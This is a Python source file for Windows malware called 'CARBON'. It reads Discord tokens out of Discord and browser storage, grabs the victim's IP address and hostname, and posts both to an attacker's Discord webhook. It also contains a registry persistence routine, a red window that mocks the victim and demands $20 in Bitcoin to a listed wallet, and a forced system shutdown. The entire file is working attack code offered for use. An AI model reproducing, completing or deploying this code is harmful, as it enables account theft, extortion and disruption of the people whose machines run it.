# imports
import os
import re
import json
import requests
import argparse
from winreg import *
import sys
from urllib.request import *
import socket
import tkinter
import random
from io import BytesIO
from PIL import Image, ImageTk
import webbrowser

# some code to add a file to startup programs, not really usefull right now, but it could be used in the future
def addStartup():
    fp = os.path.dirname(os.path.realpath(__file__))
    file_name = sys.argv[0].split('\\')[-1]
    new_file_path = fp + '\\' + file_name
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
    SetValueEx(key2change, 'CARBON', 0, REG_SZ,
               new_file_path)

# your webhook URL
WEBHOOK_URL = 'you know what to do.'

# mentions you when you get a hit
PING_ME = False

# grabs ip using urlopen, then reads
external_ip = urlopen('https://ident.me').read().decode('utf8')
# grabs hostname using socket, quite a easy workaround
hostname = socket.gethostname()


# hacker shit
def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

# grabs path for browsers
def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }
# in case PING_ME is set to true
    message = '@everyone' if PING_ME else ''
    message2 = '@everyone' if PING_ME else ''

# things for the webhook
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'


        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

        message += '```'

    message2 += f"```user's ip is {external_ip}, and hostname is {hostname}```"

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }
# since we have 2 things to send, we send 2 messages cuz im too lazy to mess with it so its all in 1 message.
    payload = json.dumps({'content': message})
    payload2 = json.dumps({'content': message2})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        req2 = Request(WEBHOOK_URL, data=payload2.encode(), headers=headers)
        urlopen(req)
        urlopen(req2)
    except:
        pass



if __name__ == '__main__':
    main()



# here starts the tkinter setup


joinked = [
		   'you just got hey stinkied!',
		   'i like ya discord account g',
		   'Sector B in the photosynthesis sector is contacting MBR',
		   'ez',
		   'bush did 9/11',
		   'two bee two tee',
		   'salc1',
		   'https://www.youtube.com/watch?v=dQw4w9WgXcQ',

]
window = tkinter.Tk()

window.geometry("800x400")
window.configure(bg='red')
window.title("CARBON IS UPON YOU")

def RandomText():
    rand = random.choice(joinked)
    text.configure(text=f"{rand}", fg='white', bg='red')

def kekma():
    webbrowser.open('https://www.youtube.com/watch?v=g8jWi6ipSew')

# def howdoipay():
#     break


MyTitle = tkinter.Label(window, text="There is no escape from CARBON",font="Helvetica 16 bold", fg='white', bg='red')
MyTitle.pack()

text = tkinter.Label(window, font="Helvetica 16 bold")
text.pack()

MyTitle2 = tkinter.Label(window, text="so basically i stole ur discord acc, and ur ip. sry... please search minecraft rule 34 for further support.", font="Hevetica 12 bold", fg='white', bg='red')
MyTitle2.pack()
# meatspin sight is dead so this works
URL = "data:image/jpeg;base64,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"
u = urlopen(URL)
raw_data = u.read()
u.close()

im = Image.open(BytesIO(raw_data))
photo = ImageTk.PhotoImage(im)

label = tkinter.Label(image=photo)
label.image = photo
label.pack()

MyButton = tkinter.Button(window, text="Exit?", command=lambda:[RandomText(),kekma()])
MyButton.pack()

MyTitle3 = tkinter.Label(window, text="Please pay 20$ worth of BTC or it WILL become worse.", font="Hevetica 12 bold", fg='white', bg='red')
MyTitle3.pack()

MyTitle4 = tkinter.Label(window, text="bc1q6zuejp4cdwtgtluqzg8av8mluypz3lfp5rt6z8j9v820yzynt87qf0djlf", font="Hevetica 12 bold", fg='white', bg='red')
MyTitle4.pack()

window.mainloop()



# shuts down the system as soon as the logging is done, this would be helpful if i had a MBR overwrite
os.system('shutdown /s /f /c "Carbon is upon you." /t 0')
